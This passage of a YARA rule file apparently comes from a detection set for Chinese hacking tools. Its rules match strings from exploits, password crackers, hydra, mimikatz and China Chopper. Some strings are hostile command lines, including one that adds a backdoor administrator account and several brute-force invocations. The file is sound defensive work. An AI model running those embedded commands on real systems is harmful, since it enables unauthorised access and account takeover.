$s5 = \"HASH1.0\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 600KB and all of them\n}\n\nrule OSEditor_RID2A1A : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file OSEditor_RID2A1A.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 03:35:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"OSEditor_RID2A1A.exe\" fullword wide\n      $s2 = \"netsafe\" wide\n      $s3 = \"OSC Editor\" fullword wide\n      $s4 = \"GIF89\" ascii\n      $s5 = \"Unlock\" ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule GoodToolset_ms11011_RID2DB7 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file ms11011.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 10:43:41\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"\\\\i386\\\\Hello.pdb\" ascii\n      $s1 = \"OS not supported.\" fullword ascii\n      $s3 = \"Not supported.\" fullword wide\n      $s4 = \"SystemDefaultEUDCFont\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule FreeVersion_release_RID2EB9 : CHINA DEMO EXE FILE HKTL T1087_001 T1087_002 T1136 {\n   meta:\n      description = \"Chinese Hacktool Set - file release.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 11:26:41\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL, T1087_001, T1087_002, T1136\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"-->Got WMI process Pid: %d \" ascii\n      $s2 = \"This exploit will execute \\\"net user \" ascii\n      $s3 = \"net user temp 123456 /add & net localgroup administrators temp /add\" fullword ascii\n      $s4 = \"Running reverse shell\" ascii\n      $s5 = \"wmiprvse.exe\" fullword ascii\n      $s6 = \"SELECT * FROM IIsWebInfo\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 3 of them\n}\n\nrule HKTL_MAL_Churrasco_Jun16_RID2F79 : CHINA DEMO EXE FILE HKTL MAL {\n   meta:\n      description = \"Chinese Hacktool Set - file churrasco.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 11:58:41\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Done, command should have ran as SYSTEM!\" ascii\n      $s2 = \"Running command with SYSTEM Token...\" ascii\n      $s3 = \"Thread impersonating, got NETWORK SERVICE Token: 0x%x\" ascii\n      $s4 = \"Found SYSTEM token 0x%x\" ascii\n      $s5 = \"Thread not impersonating, looking for another thread...\" ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 150KB and 2 of them\n}\n\nrule x64_KiwiCmd_RID2AFA : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file KiwiCmd.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 08:46:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Process Ok, Memory Ok, resuming process :)\" fullword wide\n      $s2 = \"Kiwi Cmd no-gpo\" fullword wide\n      $s3 = \"KiwiAndCMD\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and 2 of them\n}\n\nrule sql1433_SQL_RID2A7B : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file SQL.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 06:16:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = { 50 00 72 00 6F 00 64 00 75 00 63 00 74 00 4E 00 61 00 6D 00 65 00 00 00 00 00 31 00 34 00 33 00 33 } \n      $s1 = { 50 00 72 00 6F 00 64 00 75 00 63 00 74 00 56 00 65 00 72 00 73 00 69 00 6F 00 6E 00 00 00 31 00 2C 00 34 00 2C 00 33 00 2C 00 33 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 90KB and all of them\n}\n\nrule CookieTools2_RID2BAE : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file CookieTools2_RID2BAE.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:16:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"www.gxgl.com&www.gxgl.net\" fullword wide\n      $s2 = \"ip.asp?IP=\" fullword ascii\n      $s3 = \"MSIE 5.5;\" fullword ascii\n      $s4 = \"SOFTWARE\\\\Borland\\\\\" ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 700KB and all of them\n}\n\nrule cyclotron_RID2AEE : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file cyclotron_RID2AEE.sys\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:28:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\Device\\\\IDTProt\" wide\n      $s2 = \"IoDeleteSymbolicLink\" fullword ascii\n      $s3 = \"\\\\??\\\\slIDTProt\" wide\n      $s4 = \"IoDeleteDevice\" fullword ascii\n      $s5 = \"IoCreateSymbolicLink\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 3KB and all of them\n}\n\nrule xscan_gui_RID2AD2 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file xscan_gui_RID2AD2.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 08:41:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"%s -mutex %s -host %s -index %d -config \\\"%s\\\"\" fullword ascii\n      $s2 = \"www.target.com\" fullword ascii\n      $s3 = \"%s\\\\scripts\\\\desc\\\\%s.desc\" fullword ascii\n      $s4 = \"%c Active/Maximum host thread: %d/%d, Current/Maximum thread: %d/%d, Time(s): %l\" ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and all of them\n}\n\nrule CN_Tools_hscan_RID2C7E : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file hscan.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:51:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"%s -f hosts.txt -port -ipc -pop -max 300,20 -time 10000\" fullword ascii\n      $s2 = \"%s -h 192.168.0.1 192.168.0.254 -port -ftp -max 200,20\" fullword ascii\n      $s3 = \"%s -h www.target.com -all\" fullword ascii\n      $s4 = \".\\\\report\\\\%s-%s.html\" fullword ascii\n      $s5 = \".\\\\log\\\\Hscan.log\" fullword ascii\n      $s6 = \"[%s]: Found cisco Enable password: %s !!!\" fullword ascii\n      $s7 = \"%s@ftpscan#FTP Account:  %s/[null]\" fullword ascii\n      $s8 = \".\\\\conf\\\\mysql_pass.dic\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them\n}\n\nrule GoodToolset_pr_RID2CC5 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file pr.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 10:03:21\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"-->Got WMI process Pid: %d \" ascii\n      $s2 = \"-->This exploit gives you a Local System shell \" ascii\n      $s3 = \"wmiprvse.exe\" fullword ascii\n      $s4 = \"Try the first %d time\" fullword ascii\n      $s5 = \"-->Build&&Change By p \" ascii\n      $s6 = \"root\\\\MicrosoftIISv2\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule hydra_7_4_1_hydra_RID2D59 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file hydra.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 10:28:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"%d of %d target%s%scompleted, %lu valid password%s found\" fullword ascii\n      $s2 = \"[%d][smb] Host: %s Account: %s Error: ACCOUNT_CHANGE_PASSWORD\" fullword ascii\n      $s3 = \"hydra -P pass.txt target cisco-enable  (direct console access)\" fullword ascii\n      $s4 = \"[%d][smb] Host: %s Account: %s Error: PASSWORD EXPIRED\" fullword ascii\n      $s5 = \"[ERROR] SMTP LOGIN AUTH, either this auth is disabled\" fullword ascii\n      $s6 = \"\\\"/login.php:user=^USER^&pass=^PASS^&mid=123:incorrect\\\"\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and 2 of them\n}\n\nrule CN_Tools_srss_2_RID2CCD : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file srss.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 10:04:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"used pepack!\" fullword ascii\n      $s1 = \"KERNEL32.dll\" fullword ascii\n      $s2 = \"KERNEL32.DLL\" fullword ascii\n      $s3 = \"LoadLibraryA\" fullword ascii\n      $s4 = \"GetProcAddress\" fullword ascii\n      $s5 = \"VirtualProtect\" fullword ascii\n      $s6 = \"VirtualAlloc\" fullword ascii\n      $s7 = \"VirtualFree\" fullword ascii\n      $s8 = \"ExitProcess\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and ( $x1 at 0 ) and filesize < 14KB and all of ( $s* )\n}\n\nrule Dos_NtGod_RID2A72 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file NtGod.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 06:01:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"\\\\temp\\\\NtGodMode.exe\" ascii\n      $s4 = \"NtGodMode.exe\" fullword ascii\n      $s10 = \"ntgod.bat\" fullword ascii\n      $s19 = \"sfxcmd\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 250KB and all of them\n}\n\nrule tools_NTCmd_RID2B57 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file NTCmd.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:02:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"pipecmd \\\\\\\\%s -U:%s -P:\\\"\\\" %s\" fullword ascii\n      $s2 = \"[Usage]:  %s <HostName|IP> <Username> <Password>\" fullword ascii\n      $s3 = \"pipecmd \\\\\\\\%s -U:%s -P:%s %s\" fullword ascii\n      $s4 = \"============By uhhuhy (Feb 18,2003) - http://www.cnhonker.net============\" fullword ascii\n      $s5 = \"=======================NTcmd v0.11 for HScan v1.20=======================\" fullword ascii\n      $s6 = \"NTcmd>\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 80KB and 2 of them\n}\n\nrule mysql_pwd_crack_RID2D54 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file mysql_pwd_crack_RID2D54.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 10:27:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"mysql_pwd_crack_RID2D54 127.0.0.1 -x 3306 -p root -d userdict.txt\" fullword ascii\n      $s2 = \"Successfully --> username %s password %s \" fullword ascii\n      $s3 = \"zhouzhen@gmail.com http://zhouzhen.eviloctal.org\" fullword ascii\n      $s4 = \"-a automode  automatic crack the mysql password \" fullword ascii\n      $s5 = \"mysql_pwd_crack_RID2D54 127.0.0.1 -x 3306 -a\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 1 of them\n}\n\nrule CmdShell64_RID2A87 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file CmdShell64_RID2A87.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 06:36:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"C:\\\\Windows\\\\System32\\\\JAVASYS.EXE\" fullword wide\n      $s2 = \"ServiceCmdShell\" fullword ascii\n      $s3 = \"<!-- If your application is designed to work with Windows 8.1, uncomment the fol\" ascii\n      $s4 = \"ServiceSystemShell\" fullword wide\n      $s5 = \"[Root@CmdShell ~]#\" fullword wide\n      $s6 = \"Hello Man 2015 !\" fullword wide\n      $s7 = \"CmdShell\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 30KB and 4 of them\n}\n\nrule Ms_Viru_v_RID2AAB : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file v.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 07:36:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"c:\\\\windows\\\\system32\\\\command.com /c \" fullword ascii\n      $s2 = \"Easy Usage Version -- Edited By: racle@tian6.com\" fullword ascii\n      $s3 = \"OH,Sry.Too long command.\" fullword ascii\n      $s4 = \"Success! Commander.\" fullword ascii\n      $s5 = \"Hey,how can racle work without ur command ?\" fullword ascii\n      $s6 = \"The exploit thread was unable to map the virtual 8086 address space\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 3 of them\n}\n\nrule CN_Tools_Vscan_RID2C6C : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file Vscan.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:48:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"[+] Usage: VNC_bypauth <target> <scantype> <option>\" fullword ascii\n      $s2 = \"========RealVNC <= 4.1.1 Bypass Authentication Scanner=======\" fullword ascii\n      $s3 = \"[+] Type VNC_bypauth <target>,<scantype> or <option> for more informations\" fullword ascii\n      $s4 = \"VNC_bypauth -i 192.168.0.1,192.168.0.2,192.168.0.3,...\" fullword ascii\n      $s5 = \"-vn:%-15s:%-7d  connection closed\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 60KB and 2 of them\n}\n\nrule Dos_iis_RID29DB : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file iis.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 01:50:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"comspec\" fullword ascii\n      $s2 = \"program terming\" fullword ascii\n      $s3 = \"WinSta0\\\\Defau\" fullword ascii\n      $s4 = \"* FROM IIsWebInfo\" ascii\n      $s5 = \"www.icehack.\" ascii\n      $s6 = \"wmiprvse.exe\" fullword ascii\n      $s7 = \"Pid: %d\" ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 70KB and all of them\n}\n\nrule Pc_rejoice_RID2B04 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file rejoice.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 08:48:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"@members.3322.net/dyndns/update?system=dyndns&hostname=\" fullword ascii\n      $s2 = \"http://www.xxx.com/xxx.exe\" fullword ascii\n      $s3 = \"@ddns.oray.com/ph/update?hostname=\" fullword ascii\n      $s4 = \"No data to read.$Can not bind in port range (%d - %d)\" fullword wide\n      $s5 = \"ListViewProcessListColumnClick!\" fullword ascii\n      $s6 = \"http://iframe.ip138.com/ic.asp\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and 3 of them\n}\n\nrule ms11080_withcmd_RID2C3A : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file ms11080_withcmd_RID2C3A.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:40:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2022-12-21\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Usage : ms11-080.exe cmd.exe Command \" fullword ascii\n      $s2 = \"\\\\ms11080\\\\ms11080\\\\Debug\\\\ms11080.pdb\" ascii\n      $s3 = \"[>] by:Mer4en7y@90sec.org\" fullword ascii\n      $s4 = \"[>] create porcess error\" fullword ascii\n      $s5 = \"[>] ms11-080 Exploit\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 1 of them\n}\n\nrule OtherTools_xiaoa_RID2D95 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file xiaoa.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 10:38:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Usage:system_exp.exe \\\"cmd\\\"\" fullword ascii\n      $s2 = \"The shell \\\"cmd\\\" success!\" fullword ascii\n      $s3 = \"Not Windows NT family OS.\" fullword ascii\n      $s4 = \"Unable to get kernel base address.\" fullword ascii\n      $s5 = \"run \\\"%s\\\" failed,code: %d\" fullword ascii\n      $s6 = \"Windows Kernel Local Privilege Exploit \" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 2 of them\n}\n\nrule hydra_7_3_hydra_RID2CC8 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file hydra.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 10:03:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"[ATTEMPT-ERROR] target %s - login \\\"%s\\\" - pass \\\"%s\\\" - child %d - %lu of %lu\" fullword ascii\n      $s2 = \"(DESCRIPTION=(CONNECT_DATA=(CID=(PROGRAM=))(COMMAND=reload)(PASSWORD=%s)(SERVICE\" ascii\n      $s3 = \"cn=^USER^,cn=users,dc=foo,dc=bar,dc=com for domain foo.bar.com\" fullword ascii\n      $s4 = \"[%d][smb] Host: %s Account: %s Error: ACCOUNT_CHANGE_PASSWORD\" fullword ascii\n      $s5 = \"hydra -P pass.txt target cisco-enable  (direct console access)\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 700KB and 1 of them\n}\n\nrule OracleScan_RID2AEC : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file OracleScan_RID2AEC.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:25:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"MYBLOG:HTTP://HI.BAIDU.COM/0X24Q\" fullword ascii\n      $s2 = \"\\\\Borland\\\\Delphi\\\\RTL\" ascii\n      $s3 = \"USER_NAME\" ascii\n      $s4 = \"FROMWWHERE\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them\n}\n\nrule SQLTools_RID2A12 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file SQLTools_RID2A12.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 03:21:41\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"DBN_POST\" fullword wide\n      $s2 = \"LOADER ERROR\" fullword ascii\n      $s3 = \"www.1285.net\" fullword wide\n      $s4 = \"TUPFILEFORM\" fullword wide\n      $s5 = \"DBN_DELETE\" fullword wide\n      $s6 = \"DBINSERT\" fullword wide\n      $s7 = \"Copyright (C) Kibosoft Corp. 2001-2006\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 2350KB and all of them\n}\n\nrule portscanner_RID2BC0 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file portscanner_RID2BC0.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:19:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"PortListfNo\" fullword ascii\n      $s1 = \".533.net\" fullword ascii\n      $s2 = \"CRTDLL.DLL\" fullword ascii\n      $s3 = \"exitfc\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 25KB and all of them\n}\n\nrule kappfree_RID2A5F : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file kappfree_RID2A5F.dll\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 05:30:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Bienvenue dans un processus distant\" fullword wide\n      $s2 = \"kappfree_RID2A5F.dll\" fullword ascii\n      $s3 = \"kappfree_RID2A5F de mimikatz pour Windows (anti AppLocker)\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule Smartniff_RID2ABB : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file Smartniff_RID2ABB.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 08:03:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"smsniff.exe\" fullword wide\n      $s2 = \"support@nirsoft.net0\" fullword ascii\n      $s3 = \"</requestedPrivileges></security></trustInfo></assembly>\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule ChinaChopper_caidao_RID2E85 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file caidao.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 11:18:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Pass,Config,n{)\" fullword ascii\n      $s2 = \"phMYSQLZ\" fullword ascii\n      $s3 = \"\\\\DHLP\\\\.\" ascii\n      $s4 = \"\\\\dhlp\\\\.\" ascii\n      $s5 = \"SHAutoComple\" fullword ascii\n      $s6 = \"MainFrame\" ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1077KB and all of them\n}\n\nrule KiwiTaskmgr_2_RID2C0F : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file KiwiTaskmgr.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:33:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Process Ok, Memory Ok, resuming process :)\" fullword wide\n      $s2 = \"Kiwi Taskmgr no-gpo\" fullword wide\n      $s3 = \"KiwiAndTaskMgr\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and 